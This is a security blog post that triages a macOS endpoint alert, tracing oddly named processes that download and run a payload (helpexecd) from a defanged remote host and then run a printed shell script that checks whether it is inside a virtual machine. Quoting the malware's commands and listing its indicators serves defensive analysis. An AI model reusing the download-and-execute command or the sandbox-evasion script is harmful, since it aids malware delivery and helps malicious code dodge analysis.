<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Mac Malware?" /><meta property="og:locale" content="en" /><meta name="description" content="Today we investigate some strange discovery actions by processes on a macbook" /><meta property="og:description" content="Today we investigate some strange discovery actions by processes on a macbook" /><link rel="canonical" href="https://wilddogone.github.io//posts/Mac-Malware/" /><meta property="og:url" content="https://wilddogone.github.io//posts/Mac-Malware/" /><meta property="og:site_name" content="About Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-19T11:39:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Mac Malware?" /><meta name="twitter:site" content="@none" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-19T11:39:00+02:00","datePublished":"2022-05-19T11:39:00+02:00","description":"Today we investigate some strange discovery actions by processes on a macbook","headline":"Mac Malware?","mainEntityOfPage":{"@type":"WebPage","@id":"https://wilddogone.github.io//posts/Mac-Malware/"},"url":"https://wilddogone.github.io//posts/Mac-Malware/"}</script><title>Mac Malware? | About Security</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="About Security"><meta name="application-name" content="About Security"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">About Security</a></div><div class="site-subtitle font-italic">Blue and Red</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/WildDogOne" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/none" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Mac Malware?</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Mac Malware?</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/WildDogOne/">WildDogOne</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652953140" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="698 words"> <em>3 min</em> read</span></div></div></div><div class="post-content"><p>Today we investigate some strange discovery actions by processes on a macbook</p><h2 id="the-alert"><span class="mr-2">The Alert</span><a href="#the-alert" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In the essence this alert was showing multiple different processes doing very similar actions, for the sake of simplicity we will focus on one. In most cases the process <a href="https://www.unix.com/man-page/osx/8/xpcproxy/">xpcproxy</a> was used to run a sub process which in turn started some bash commands. For this investigation I put xpcproxy out of scope as it did not seem to be part of a malicious execution chain as it is part of the OS (my mac knowledge is basic) This xpcproxy would run an executable for example apadecoded and this in turn would run new processes, for example:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/bin/sh /var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/451CEB63-C438-40C3-899F-0BE4F425F074
</pre></table></code></div></div><p>apadecoded itself looks already strange enough and is also found on VT, but what is this “451CEB63-C438-40C3-899F-0BE4F425F074”? here again, for simplicity I focus on one of these odd looking processes, there are a bucket load of them.</p><p>This executable runs a download via curl of some additional code from <a href="https://www.virustotal.com/gui/url/602823beeb1e3e8c4b09c1c4defeb5c6381620e6a6b9be9c3120df12c21c0f0e">external</a> and extracts it to “/private/var/tmp/helpexecd/helpexecd”</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/usr/bin/curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-o</span> /var/tmp/helpexecd.tgz hxxp://cdn[.]eniqdix[.]icu/static/s3/exec6625/helpexecd[.]tgz
<span class="nb">tar</span> <span class="nt">-xzf</span> /var/tmp/helpexecd.tgz <span class="nt">-C</span> /var/tmp/helpexecd/
</pre></table></code></div></div><p>After that the archive helpexecd.tgz is extracted to /var/tmp/helpexecd/ and executed. This new process helpexecd then runs the following command (amongst other things)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/bin/sh <span class="nt">-c</span> <span class="s1">'readonly VM_LIST="VirtualBox\|Oracle\|VMware\|Parallels\|qemu";is_hwmodel_vm(){ ! sysctl -n hw.model|grep "Mac"&gt;/dev/null;};is_ram_vm(){(($(($(sysctl -n hw.memsize)/ 1073741824))&lt;4));};is_ped_vm(){ local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo "${ped}"|grep -e "board-id" -e "product-name" -e "model"|grep -qi "${VM_LIST}"||echo "${ped}"|grep "manufacturer"|grep -v "Apple"&gt;/dev/null;};is_vendor_name_vm(){ ioreg -l|grep -e "Manufacturer" -e "Vendor Name"|grep -qi "${VM_LIST}";};is_hw_data_vm(){ system_profiler SPHardwareDataType 2&gt;&amp;1 /dev/null|grep -e "Model Identifier"|grep -qi "${VM_LIST}";};is_vm(){ is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){ is_vm&amp;&amp;echo 1||echo 0;};main "${@}"'</span>
</pre></table></code></div></div><p>On closer inspection and a bit of unwrapping, it looks a lot like this helpexecd is trying to figure out if it’s running in a sandbox. It checks for what hardware it’s running on, good indication of sandbox evasion.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>/bin/sh <span class="nt">-c</span> <span class="s1">'readonly VM_LIST="VirtualBox\|Oracle\|VMware\|Parallels\|qemu";is_hwmodel_vm(){
 ! sysctl -n hw.model|grep "Mac"&gt;/dev/null;};is_ram_vm(){
    (($(($(sysctl -n hw.memsize)/ 1073741824))&lt;4));};is_ped_vm(){
 local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo "${
    ped}"|grep -e "board-id" -e "product-name" -e "model"|grep -qi "${
    VM_LIST}"||echo "${
    ped}"|grep "manufacturer"|grep -v "Apple"&gt;/dev/null;};is_vendor_name_vm(){
 ioreg -l|grep -e "Manufacturer" -e "Vendor Name"|grep -qi "${
    VM_LIST}";};is_hw_data_vm(){
 system_profiler SPHardwareDataType 2&gt;&amp;1 /dev/null|grep -e "Model Identifier"|grep -qi "${
    VM_LIST}";};is_vm(){
 is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){
 is_vm&amp;&amp;echo 1||echo 0;};main "${
    @}"'</span>
</pre></table></code></div></div><h2 id="flowchart"><span class="mr-2">Flowchart</span><a href="#flowchart" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><script type="text/javascript" src="/assets/js/mermaid.js"></script><div class="mermaid"> %%{init: {"theme": "dark"}}%%; flowchart TD; kernel_task --&gt; launchd; launchd --&gt; xpcproxy; xpcproxy --&gt; |run| apadecoded; apadecoded --&gt; 451CEB63-C438-40C3-899F-0BE4F425F074; apadecoded --&gt; |run| DFBDC5FD-3F69-472A-832B-C8C394560BC4; apadecoded --&gt; AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09; 451CEB63-C438-40C3-899F-0BE4F425F074 --&gt; curl; DFBDC5FD-3F69-472A-832B-C8C394560BC4 --&gt; |run| curl; AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09 --&gt; curl; curl --&gt; cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz; cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --&gt; |download| 89.187.162.142; cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --&gt; |download| 89.187.162.134; 89.187.162.142 --&gt; |download| /private/var/tmp/helpexecd/helpexecd.tgz; 89.187.162.134 --&gt; |download| /private/var/tmp/helpexecd/helpexecd.tgz; /private/var/tmp/helpexecd/helpexecd.tgz --&gt; |extract &amp;&amp; run| helpexecd; helpexecd --&gt; 35.160.226.50; helpexecd --&gt; 34.217.226.241; style apadecoded stroke-dasharray: 88.5 44 style helpexecd stroke-dasharray: 88.5 44</div><h2 id="hunting-deeper"><span class="mr-2">Hunting deeper</span><a href="#hunting-deeper" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We have so far focused on one process, but here is a list of a lot more of them. All of them do the exact same things, which really makes me think that his could be real malware, how exciting.</p><ul><li>canonistical<li>noble<li>odontolite<li>intrinsicalness<li>TestDate<li>SysUpdater<li>leam<li>recommitment<li>TestDateDaemon<li>apadecode<li>apadecoded</ul><p>I now turned to Virustotal to see what they have to say about this. Once again with focus on one process <a href="https://www.virustotal.com/gui/file/ec791335020a61a36263de7671ab9741d9212cc4692c85abca81862e0daaf82c">apadecoded</a> on VT I get a lot of Adware chatter, which in my opinion of course could be true. But some also classify this as outright malware. It is always difficult to know when to stop an investigation, I would love to analyse this more in a sandbox, but since we usually only have Windows Sandboxes, and I have no patience to build a mac one, let’s stop this here. I think we have enough indicators anyway</p><h2 id="verdict"><span class="mr-2">Verdict</span><a href="#verdict" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="table-wrapper"><table><thead><tr><th>Indicator<th>Thoughts<th>Verdict<tbody><tr><td>Process starts strangely named Processes<td>Maybe a kind of obfuscation?<td>+20%<tr><td>“Obfuscated” process downloads additional code<td>Very likely bad behaviour<td>+20%<tr><td>Newly downloaded code is checks hardware it is running on (sandbox evasion)<td>Sandbox evasion is often a bad sign<td>+20%<tr><td>Many processes doing exactly the same<td>Once again, this looks like something done to confuse the defender<td>+20%<tr><td>Virustotal results in Adware or Malware<td>Honestly, it could be Adware, but I will treat as Malware<td>+20%</table></div><p><strong>Verdict: True Positive</strong></p><h2 id="next-steps"><span class="mr-2">Next Steps</span><a href="#next-steps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Reinstall that machine, no patience for cleaning such a mess</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hunting/'>Hunting</a>, <a href='/categories/mde/'>MDE</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/mde/" class="post-tag no-text-decoration" >mde</a> <a href="/tags/hunting/" class="post-tag no-text-decoration" >hunting</a> <a href="/tags/true-positive/" class="post-tag no-text-decoration" >true positive</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Mac Malware? - About Security&amp;url=https://wilddogone.github.io//posts/Mac-Malware/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Mac Malware? - About Security&amp;u=https://wilddogone.github.io//posts/Mac-Malware/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://wilddogone.github.io//posts/Mac-Malware/&amp;text=Mac Malware? - About Security" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Debugging_Ingest_Pipelines/">Debugging Elastic Pipelines</a><li><a href="/posts/Elastic_Risk_Model/">Building a Risk Model in Elastic</a><li><a href="/posts/Building_Security/">Building Home Security</a><li><a href="/posts/Elastic_Security/">Building Elastic Security</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/howto/">howto</a> <a class="post-tag" href="/tags/hunting/">hunting</a> <a class="post-tag" href="/tags/mde/">mde</a> <a class="post-tag" href="/tags/false-positive/">false positive</a> <a class="post-tag" href="/tags/true-positive/">true positive</a> <a class="post-tag" href="/tags/elastalert/">elastalert</a> <a class="post-tag" href="/tags/m365/">m365</a> <a class="post-tag" href="/tags/psexec/">psexec</a> <a class="post-tag" href="/tags/thehive/">thehive</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Admin_Login_Failure/"><div class="card-body"> <em class="timeago small" data-ts="1653158340" > 2022-05-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Unusual number of failed sign-in attempts</h3><div class="text-muted small"><p> Today we investigate some failed logins The Alert Todays alert looks simple enough, failed loggins with the user “Administrator” But very quickly we see some not so good indicator, the login conne...</p></div></div></a></div><div class="card"> <a href="/posts/Powershell-PSexec/"><div class="card-body"> <em class="timeago small" data-ts="1652816340" > 2022-05-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Powershell and PSExec</h3><div class="text-muted small"><p> Today we investigate some strange behaviour from a (possibly user) executed Powershell session. The Alert Everything started with an explorer.exe running the following commandline. &quot;cmd.exe&quot; /...</p></div></div></a></div><div class="card"> <a href="/posts/MS_Forms/"><div class="card-body"> <em class="timeago small" data-ts="1655231940" > 2022-06-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malicious Forms</h3><div class="text-muted small"><p> Today we investigate a very interesting story. A user told us, he noticed his account was sending Microsoft Forms to internal people, and he believes he did not do that. The Alert Usually when a ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Powershell-PSexec/" class="btn btn-outline-primary" prompt="Older"><p>Powershell and PSExec</p></a> <a href="/posts/Admin_Login_Failure/" class="btn btn-outline-primary" prompt="Newer"><p>Unusual number of failed sign-in attempts</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/WildDogOne/">WildDogOne</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/howto/">howto</a> <a class="post-tag" href="/tags/hunting/">hunting</a> <a class="post-tag" href="/tags/mde/">mde</a> <a class="post-tag" href="/tags/false-positive/">false positive</a> <a class="post-tag" href="/tags/true-positive/">true positive</a> <a class="post-tag" href="/tags/elastalert/">elastalert</a> <a class="post-tag" href="/tags/m365/">m365</a> <a class="post-tag" href="/tags/psexec/">psexec</a> <a class="post-tag" href="/tags/thehive/">thehive</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
